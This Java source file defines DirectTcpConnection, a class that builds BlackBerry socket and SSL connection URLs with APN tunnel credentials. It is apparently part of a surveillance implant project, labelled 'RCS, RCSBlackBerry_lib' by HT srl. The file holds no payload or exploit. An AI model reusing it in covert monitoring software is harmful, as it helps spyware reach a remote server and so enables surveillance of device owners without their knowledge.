//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : SocketConnection.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.transfer;

import blackberry.Conf;
import blackberry.action.Apn;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.utils.Check;

// TODO: Auto-generated Javadoc
/**
 * The Class DirectTcpConnection.
 */
public final class DirectTcpConnection extends Connection {

    public static final int METHOD_FIRST = 0;
    public static final int METHOD_DEVICE = 0;
    public static final int METHOD_NODEVICE = 1;
    //public static final int METHOD_NULL = 2;
    public static final int METHOD_APN = 2;
    public static final int METHOD_LAST = 2;

    //#ifdef DEBUG
    static Debug debug = new Debug("DirectTcp", DebugLevel.VERBOSE);

    //#endif

    private final String host;
    private final int port;
    private final boolean ssl;

    int timeout = 5 * 60 * 1000;

    /*
     * String apn = Conf.DEFAULT_APN;
     * String user = Conf.DEFAULT_APN_USER;
     * String password = Conf.DEFAULT_APN_PWD;
     */
    Apn apn;

    int method;

    // Constructor
    /**
     * Instantiates a new direct tcp connection.
     * 
     * @param host_
     *            the host_
     * @param port_
     *            the port_
     * @param ssl_
     *            the ssl_
     * @param method_
     *            the method
     */
    public DirectTcpConnection(final String host_, final int port_,
            final boolean ssl_, final int method_) {
        host = host_;
        port = port_;
        ssl = ssl_;
        method = method_;

        //#ifdef DBC
        Check.requires(method_ != DirectTcpConnection.METHOD_APN,
                "DirectTcpConnection");
        //#endif
        setUrl();
    }

    public DirectTcpConnection(final String host_, final int port_,
            final boolean ssl_, final Apn apn_) {

        host = host_;
        port = port_;
        ssl = ssl_;
        method = DirectTcpConnection.METHOD_APN;

        apn = apn_;

        setUrl();
    }

    /**
     * 
     */
    private void setUrl() {
        if (ssl) {
            url = "ssl://" + host + ":" + port + ";ConnectionTimeout="
                    + timeout;

        } else {
            url = "socket://" + host + ":" + port + ";ConnectionTimeout="
                    + timeout;
        }

        switch (method) {
        case METHOD_DEVICE:
            url += ";deviceside=true";
            break;
        case METHOD_NODEVICE:
            url += ";deviceside=false";
            break;
        //case METHOD_NULL:
        //    break;
        case METHOD_APN:
            if (apn != null) {
                url += ";deviceside=true;apn=" + apn.apn
                        + ";tunnelauthusername=" + apn.user
                        + ";tunnelauthpassword=" + apn.pass;
            } else {
                //#ifdef DEBUG_WARN
                debug.trace("setUrl: apn default");
                //#endif
                url += ";deviceside=true;apn=" + Conf.DEFAULT_APN
                + ";tunnelauthusername=" + Conf.DEFAULT_APN_USER
                + ";tunnelauthpassword=" + Conf.DEFAULT_APN_PWD;
            }
            break;
        }

        //#ifdef DEBUG_TRACE
        debug.trace("method: " + method + " url: " + url);
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see blackberry.transfer.Connection#error(java.lang.String)
     */
    protected void error(final String string) {
        //#ifdef DEBUG
        debug.error(string);
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see blackberry.transfer.Connection#isActive()
     */
    public synchronized boolean isActive() {
        return true;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.transfer.Connection#trace(java.lang.String)
     */
    protected void trace(final String string) {
        //#ifdef DEBUG_TRACE
        debug.trace(string);
        //#endif
    }
}
